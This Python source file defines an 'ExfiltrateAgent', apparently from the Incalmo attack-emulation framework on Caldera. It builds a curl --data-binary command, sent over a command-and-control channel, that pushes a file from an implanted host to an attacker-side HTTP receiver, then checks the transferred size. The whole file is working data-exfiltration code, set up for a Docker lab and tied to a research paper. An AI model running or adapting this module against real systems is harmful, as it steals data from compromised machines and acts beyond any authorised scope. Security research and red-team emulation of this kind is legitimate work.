import os
from incalmo.core.actions.low_level import CommandRunner
from incalmo.core.services.exfil_receiver import ExfilReceiver
from .base_agent import BaseAgent


class ExfiltrateAgent(BaseAgent):
    """
    ExfiltrateData task agent.

    Push model (matches the paper): the implanted host pushes the file
    to an HTTP receiver on the attacker side via curl --data-binary.
    The C&C command channel carries only the short curl invocation;
    the bulk data travels over an independent HTTP connection.
    """

    def run(
        self,
        runner: CommandRunner,
        data_path: str,
        receiver_url: str = "http://host.docker.internal:9000/upload"
    ) -> dict:

        # Confirm file exists and get exact size
        # Short output — fits the command channel fine
        size_output = runner.run(f"wc -c < {data_path}")
        if not size_output:
            return self._failure(f"File not found or unreadable: {data_path}")

        try:
            expected_size = int(size_output.strip().split()[0])
        except (ValueError, IndexError):
            return self._failure(f"Could not parse file size: {size_output}")

        print(f"[ExfiltrateAgent] target: {data_path}")
        print(f"[ExfiltrateAgent] expected size: {expected_size} bytes")

        # Start HTTP receiver on attacker side before issuing the push command
        receiver = ExfilReceiver(port=9000, output_dir="output")
        receiver.start()

        # Issue one short curl command via C&C channel
        # --data-binary sends raw bytes with no multipart overhead
        # timeout=120 gives curl enough time to push a 3 MB file
        curl_cmd = (
            f'curl -s -o /dev/null -w "%{{http_code}}" '
            f'--data-binary @{data_path} '
            f'--max-time 90 '
            f'{receiver_url}'
        )

        print(f"[ExfiltrateAgent] sending push command...")
        # Pass a longer timeout to runner so Caldera does not cut the link early
        status_code = runner.run(curl_cmd)
        print(f"[ExfiltrateAgent] curl status: {status_code}")

        # Wait for file to arrive (receiver runs in background thread)
        saved_path = receiver.wait_for_file(timeout=120)
        receiver.stop()

        if not saved_path:
            return self._failure("Timed out waiting for file")

        # Verify byte count matches source
        actual_size = os.path.getsize(saved_path)
        print(f"[ExfiltrateAgent] received: {actual_size} bytes")
        print(f"[ExfiltrateAgent] saved to: {saved_path}")

        if actual_size != expected_size:
            return self._failure(
                f"Size mismatch: expected {expected_size}, got {actual_size}"
            )

        return self._success(
            f"Exfiltrated {actual_size} bytes from {data_path}",
            {
                "path": data_path,
                "size": actual_size,
                "saved_to": saved_path
            }
        )